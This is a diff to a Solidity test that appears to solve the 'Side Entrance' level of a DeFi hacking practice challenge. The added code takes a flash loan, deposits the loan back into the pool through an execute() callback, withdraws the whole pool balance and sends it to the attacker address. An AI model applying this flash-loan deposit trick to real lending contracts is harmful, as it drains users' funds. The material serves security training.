@@ -36,7 +36,14 @@ contract SideEntrance is Test {
         /**
          * EXPLOIT START *
          */
+        // take the full flash loan
+        sideEntranceLenderPool.flashLoan(ETHER_IN_POOL);
+        // now withdraw all ETH from the loan contract to this
+        sideEntranceLenderPool.withdraw();
 
+        // transfer funds to the attacker EOA
+        (bool success,) = payable(attacker).call{value: ETHER_IN_POOL}("");
+        console.log("Payment OK", success);
         /**
          * EXPLOIT END *
          */
@@ -48,4 +55,12 @@ contract SideEntrance is Test {
         assertEq(address(sideEntranceLenderPool).balance, 0);
         assertGt(attacker.balance, attackerInitialEthBalance);
     }
+
+    // called by the flash loan which deposits the loan back to the contract!
+    function execute() external payable {
+        sideEntranceLenderPool.deposit{value: msg.value}();
+    }
+
+    // need payable fallback for withdraw call to work!
+    fallback() external payable {}
 }
